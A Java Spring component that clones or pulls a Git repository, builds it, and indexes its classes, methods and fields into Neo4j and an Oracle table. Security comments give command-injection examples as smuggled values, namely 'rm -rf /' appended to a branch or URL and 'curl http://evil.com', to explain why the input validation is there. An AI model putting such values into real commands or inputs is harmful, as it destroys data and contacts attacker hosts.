package com.purchasingpower.autoflow.workflow.agents;

import com.purchasingpower.autoflow.configuration.AppProperties;
import com.purchasingpower.autoflow.model.git.ParsedGitUrl;
import com.purchasingpower.autoflow.model.neo4j.ParsedCodeGraph;
import com.purchasingpower.autoflow.parser.EntityExtractor;
import com.purchasingpower.autoflow.service.GitOperationsService;
import com.purchasingpower.autoflow.service.MavenBuildService;
import com.purchasingpower.autoflow.storage.Neo4jGraphStore;
import com.purchasingpower.autoflow.util.GitInputValidator;
import com.purchasingpower.autoflow.util.GitUrlParser;
import com.purchasingpower.autoflow.workflow.state.*;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Component;
import org.springframework.transaction.annotation.Transactional;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.stream.Collectors;
import java.util.stream.Stream;

/**
 * CodeIndexerAgent - Indexes repository code for RAG retrieval.
 *
 * ✅ UPDATED: Now uses Neo4j-only indexing (removed Pinecone).
 * Uses EntityExtractor + Neo4jGraphStore for knowledge graph.
 * Syncs to Oracle CODE_NODES table for backward compatibility.
 */
@Slf4j
@Component
@RequiredArgsConstructor
public class CodeIndexerAgent {

    private final GitOperationsService gitService;
    private final MavenBuildService buildService;
    private final EntityExtractor entityExtractor;
    private final Neo4jGraphStore neo4jGraphStore;
    private final com.purchasingpower.autoflow.repository.GraphNodeRepository graphNodeRepository;
    private final AppProperties appProperties;
    private final GitUrlParser gitUrlParser;

    @Transactional
    public Map<String, Object> execute(WorkflowState state) {
        log.info("📦 Indexing codebase: {}", state.getRepoUrl());

        try {
            Map<String, Object> updates = new HashMap<>(state.toMap());

            // Parse Git URL to extract clean repo URL and branch
            ParsedGitUrl parsed = gitUrlParser.parse(state.getRepoUrl());
            String cleanRepoUrl = parsed.getRepoUrl();
            String branch = parsed.getBranch();
            String repoName = parsed.getRepoName();

            log.info("Parsed URL: repo={}, branch={}, name={}", cleanRepoUrl, branch, repoName);

            log.info("📥 Proceeding with repository indexing");
            // ================================================================
            // OPTIMIZATION: Skip build for documentation tasks
            // ================================================================

            RequirementAnalysis analysis = state.getRequirementAnalysis();
            boolean isDocumentationTask = analysis != null &&
                    "documentation".equalsIgnoreCase(analysis.getTaskType());

            // ================================================================
            // STEP 1: CLONE OR REUSE WORKSPACE
            // ================================================================

            File workspace = getOrCloneWorkspace(cleanRepoUrl, branch, repoName);
            updates.put("workspaceDir", workspace.getAbsolutePath());  // CRITICAL: Store as String!

            log.info("✅ Workspace ready: {}", workspace.getAbsolutePath());

            // ================================================================
            // STEP 2: BASELINE BUILD
            // ================================================================

            // OPTIMIZATION: Skip build for documentation requests
            BuildResult baseline;
            if (isDocumentationTask) {
                log.info("📚 Documentation request - skipping build validation (saves ~60 seconds)");
                baseline = BuildResult.builder()
                        .success(true)
                        .durationMs(0L)
                        .buildLogs("Build skipped for documentation request")
                        .compilationErrors(new ArrayList<>())
                        .build();
            } else {
                log.info("🔨 Running baseline build...");
                baseline = buildService.buildAndVerify(workspace);
            }

            updates.put("baselineBuild", baseline);

            if (!baseline.isSuccess()) {
                updates.put("lastAgentDecision", AgentDecision.askDev(
                        "❌ **Repository Has Compilation Errors**\n\n" +
                                "Cannot work on broken codebase.\n\n" +
                                "**Errors:**\n```\n" + baseline.getErrors() + "\n```\n\n" +
                                "Options:\n1. Fix errors first\n2. Force index anyway (risky)"
                ));
                return updates;
            }

            // ================================================================
            // STEP 3: NEO4J GRAPH UPDATE
            // ================================================================

            log.info("🔄 Updating Neo4j code graph...");

            // Find all Java files in workspace
            List<Path> javaFiles = findAllJavaFiles(workspace);
            log.info("Found {} Java files to process", javaFiles.size());

            // Parse each file and combine into one graph
            List<String> parseErrors = new ArrayList<>();
            ParsedCodeGraph combinedGraph = ParsedCodeGraph.builder().build();

            for (Path javaFile : javaFiles) {
                try {
                    ParsedCodeGraph fileGraph = entityExtractor.extractFromFile(javaFile);

                    // Merge into combined graph
                    combinedGraph.getClasses().addAll(fileGraph.getClasses());
                    combinedGraph.getMethods().addAll(fileGraph.getMethods());
                    combinedGraph.getFields().addAll(fileGraph.getFields());
                    combinedGraph.getRelationships().addAll(fileGraph.getRelationships());

                } catch (Exception e) {
                    String errorMsg = javaFile.getFileName() + ": " + e.getMessage();
                    parseErrors.add(errorMsg);
                    log.warn("Failed to parse {}: {}", javaFile.getFileName(), e.getMessage());
                }
            }

            // Store entire graph (MERGE handles updates automatically!)
            neo4jGraphStore.storeCodeGraph(combinedGraph);

            log.info("✅ Neo4j graph updated:");
            log.info("   Classes: {}", combinedGraph.getClasses().size());
            log.info("   Methods: {}", combinedGraph.getMethods().size());
            log.info("   Fields: {}", combinedGraph.getFields().size());
            log.info("   Relationships: {}", combinedGraph.getRelationships().size());

            // ================================================================
            // STEP 4: ORACLE CODE_NODES TABLE SYNC
            // ================================================================

            log.info("🔄 Syncing to Oracle CODE_NODES table...");

            // Convert Neo4j entities to JPA GraphNode entities
            List<com.purchasingpower.autoflow.model.graph.GraphNode> graphNodes = new ArrayList<>();

            // Convert classes
            for (var classNode : combinedGraph.getClasses()) {
                graphNodes.add(com.purchasingpower.autoflow.model.graph.GraphNode.builder()
                        .nodeId(classNode.getId())
                        .type(com.purchasingpower.autoflow.model.ast.ChunkType.CLASS)
                        .repoName(repoName)
                        .fullyQualifiedName(classNode.getFullyQualifiedName())
                        .simpleName(classNode.getName())
                        .packageName(classNode.getPackageName())
                        .filePath(classNode.getSourceFilePath())
                        .parentNodeId(null)
                        .summary(classNode.getJavadoc() != null ? classNode.getJavadoc() : "")
                        .lineCount(classNode.getEndLine() - classNode.getStartLine())
                        .domain(null) // Will be populated by LLM later if needed
                        .businessCapability(null)
                        .features(null)
                        .concepts(null)
                        .build());
            }

            // Convert methods
            for (var methodNode : combinedGraph.getMethods()) {
                graphNodes.add(com.purchasingpower.autoflow.model.graph.GraphNode.builder()
                        .nodeId(methodNode.getId())
                        .type(com.purchasingpower.autoflow.model.ast.ChunkType.METHOD)
                        .repoName(repoName)
                        .fullyQualifiedName(methodNode.getFullyQualifiedName())
                        .simpleName(methodNode.getName())
                        .packageName(methodNode.getClassName().substring(0,
                                methodNode.getClassName().lastIndexOf('.') > 0 ?
                                methodNode.getClassName().lastIndexOf('.') : 0))
                        .filePath(methodNode.getSourceFilePath())
                        .parentNodeId(methodNode.getClassName()) // Parent is the class
                        .summary(methodNode.getJavadoc() != null ? methodNode.getJavadoc() : "")
                        .lineCount(methodNode.getEndLine() - methodNode.getStartLine())
                        .domain(null)
                        .businessCapability(null)
                        .features(null)
                        .concepts(null)
                        .build());
            }

            // Convert fields
            for (var fieldNode : combinedGraph.getFields()) {
                graphNodes.add(com.purchasingpower.autoflow.model.graph.GraphNode.builder()
                        .nodeId(fieldNode.getId())
                        .type(com.purchasingpower.autoflow.model.ast.ChunkType.FIELD)
                        .repoName(repoName)
                        .fullyQualifiedName(fieldNode.getFullyQualifiedName())
                        .simpleName(fieldNode.getName())
                        .packageName(fieldNode.getClassName().substring(0,
                                fieldNode.getClassName().lastIndexOf('.') > 0 ?
                                fieldNode.getClassName().lastIndexOf('.') : 0))
                        .filePath(fieldNode.getSourceFilePath())
                        .parentNodeId(fieldNode.getClassName()) // Parent is the class
                        .summary(fieldNode.getJavadoc() != null ? fieldNode.getJavadoc() : "")
                        .lineCount(1)
                        .domain(null)
                        .businessCapability(null)
                        .features(null)
                        .concepts(null)
                        .build());
            }

            // Delete old nodes for this repo and save new ones
            graphNodeRepository.deleteByRepoName(repoName);
            graphNodeRepository.saveAll(graphNodes);

            log.info("✅ Oracle CODE_NODES table updated: {} nodes saved", graphNodes.size());

            // ================================================================
            // STEP 5: BUILD INDEXING RESULT
            // ================================================================

            int totalNodes = combinedGraph.getClasses().size() +
                           combinedGraph.getMethods().size() +
                           combinedGraph.getFields().size();

            IndexingResult indexingResult = IndexingResult.builder()
                    .success(true)
                    .filesProcessed(javaFiles.size())
                    .chunksCreated(0)  // No longer tracking chunks (was Pinecone-specific)
                    .graphNodesCreated(totalNodes)
                    .graphEdgesCreated(combinedGraph.getRelationships().size())
                    .indexedCommit(null)  // TODO: Get current git commit if needed
                    .indexType(IndexingResult.IndexType.FULL)
                    .errors(parseErrors)
                    .durationMs(0L)  // TODO: Track duration if needed
                    .build();

            updates.put("indexingResult", indexingResult);
            updates.put("lastAgentDecision", AgentDecision.proceed(
                    String.format("✅ Indexed %d classes, %d methods, %d fields to Neo4j + Oracle",
                            combinedGraph.getClasses().size(),
                            combinedGraph.getMethods().size(),
                            combinedGraph.getFields().size())
            ));

            return updates;

        } catch (Exception e) {
            log.error("Code indexing failed", e);

            // ✅ FIX: Explicitly rollback transaction to prevent data loss
            // Problem: We catch exceptions to show user-friendly errors, but this prevents
            // Spring's automatic rollback (which only happens on uncaught exceptions).
            // Solution: Mark transaction for rollback explicitly before returning.
            //
            // Data loss scenario without this fix:
            // 1. deleteByRepoName() succeeds → old nodes deleted
            // 2. saveAll() fails → exception thrown
            // 3. Exception caught here → transaction commits (!)
            // 4. Result: Old nodes deleted, new nodes not saved → DATA LOSS
            try {
                org.springframework.transaction.interceptor.TransactionAspectSupport
                        .currentTransactionStatus()
                        .setRollbackOnly();
                log.debug("Transaction marked for rollback");
            } catch (Exception txEx) {
                // No active transaction (e.g., in tests) - that's okay
                log.debug("No active transaction to rollback: {}", txEx.getMessage());
            }

            Map<String, Object> updates = new HashMap<>(state.toMap());

            // Return error result
            IndexingResult errorResult = IndexingResult.builder()
                    .success(false)
                    .errors(List.of(e.getMessage()))
                    .indexType(IndexingResult.IndexType.FULL)
                    .build();

            // Create user-friendly error message
            String errorMessage;
            if (e.getMessage() != null && e.getMessage().contains("Invalid remote")) {
                errorMessage = "❌ **Failed to Clone Repository**\n\n" +
                        "The repository URL appears to be invalid or inaccessible.\n\n" +
                        "**URL provided:** " + state.getRepoUrl() + "\n\n" +
                        "**Error:** " + e.getMessage() + "\n\n" +
                        "**Possible solutions:**\n" +
                        "1. Check if the repository URL is correct\n" +
                        "2. Verify you have access to the repository\n" +
                        "3. Ensure the branch name is correct\n" +
                        "4. Try using the clean git URL format (without /tree/)";
            } else {
                errorMessage = "❌ **Code Indexing Failed**\n\n" +
                        "Error: " + e.getMessage() + "\n\n" +
                        "Please check the logs for more details.";
            }

            updates.put("indexingResult", errorResult);
            updates.put("lastAgentDecision", AgentDecision.error(errorMessage));
            return updates;
        }
    }

    /**
     * Find all Java source files in workspace
     */
    private List<Path> findAllJavaFiles(File workspace) throws IOException {
        Path srcMainJava = workspace.toPath().resolve("src/main/java");

        if (!Files.exists(srcMainJava)) {
            log.warn("No src/main/java directory found in workspace");
            return new ArrayList<>();
        }

        try (Stream<Path> paths = Files.walk(srcMainJava)) {
            return paths
                    .filter(Files::isRegularFile)
                    .filter(path -> path.toString().endsWith(".java"))
                    .collect(Collectors.toList());
        }
    }

    /**
     * Clone repository or reuse existing workspace
     * OPTIMIZATION: Reuses workspace and just pulls instead of re-cloning
     */
    private File getOrCloneWorkspace(String repoUrl, String branch, String repoName) {
        // Define workspace location
        String workspaceBase = appProperties.getWorkspaceDir();
        File workspace = new File(workspaceBase, repoName);

        // Check if workspace exists and is valid Git repo
        if (workspace.exists() && workspace.isDirectory()) {
            File gitDir = new File(workspace, ".git");
            if (gitDir.exists() && gitDir.isDirectory()) {
                log.info("✅ Reusing existing workspace: {}", workspace.getAbsolutePath());

                // Pull latest changes using git command
                try {
                    log.info("Pulling latest changes...");

                    // ✅ SECURITY: Validate branch name to prevent command injection
                    // Attack example: branch = "main; rm -rf /" → would execute malicious command
                    GitInputValidator.validateBranchName(branch);

                    ProcessBuilder pb = new ProcessBuilder("git", "pull", "origin", branch);
                    pb.directory(workspace);
                    pb.redirectErrorStream(true);

                    Process process = pb.start();
                    int exitCode = process.waitFor();

                    if (exitCode == 0) {
                        log.info("✅ Successfully pulled latest changes");
                        return workspace;
                    } else {
                        log.warn("Git pull failed with exit code: {}", exitCode);
                    }
                } catch (Exception e) {
                    log.warn("Failed to pull changes: {}", e.getMessage());
                    // Fall through to re-clone
                }
            }
        }

        // Clone fresh
        log.info("🔄 Cloning repository...");
        return gitService.cloneRepository(repoUrl, branch);
    }

    /**
     * Get current commit hash from remote repository without cloning.
     * Uses git ls-remote to query the remote HEAD.
     */
    private String getCurrentCommitFromRemote(String repoUrl, String branch) {
        try {
            log.debug("Querying remote commit for branch: {}", branch);

            // ✅ SECURITY: Validate inputs to prevent command injection
            // Attack examples:
            // - repoUrl = "https://github.com/user/repo; rm -rf /"
            // - branch = "main && curl http://evil.com"
            GitInputValidator.validateRepoUrl(repoUrl);
            GitInputValidator.validateBranchName(branch);

            ProcessBuilder pb = new ProcessBuilder(
                    "git", "ls-remote", repoUrl, "refs/heads/" + branch
            );
            pb.redirectErrorStream(true);
            Process process = pb.start();

            try (java.io.BufferedReader reader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(process.getInputStream()))) {
                String line = reader.readLine();
                if (line != null && line.length() >= 40) {
                    String commit = line.substring(0, 40);
                    log.debug("Remote HEAD at: {}", commit.substring(0, 8));
                    return commit;
                }
            }

            process.waitFor();
            log.warn("Could not determine remote commit, will proceed with full index");
            return null;

        } catch (Exception e) {
            log.warn("Failed to query remote commit: {}", e.getMessage());
            return null;  // Fail safe - proceed with full index if can't check
        }
    }
}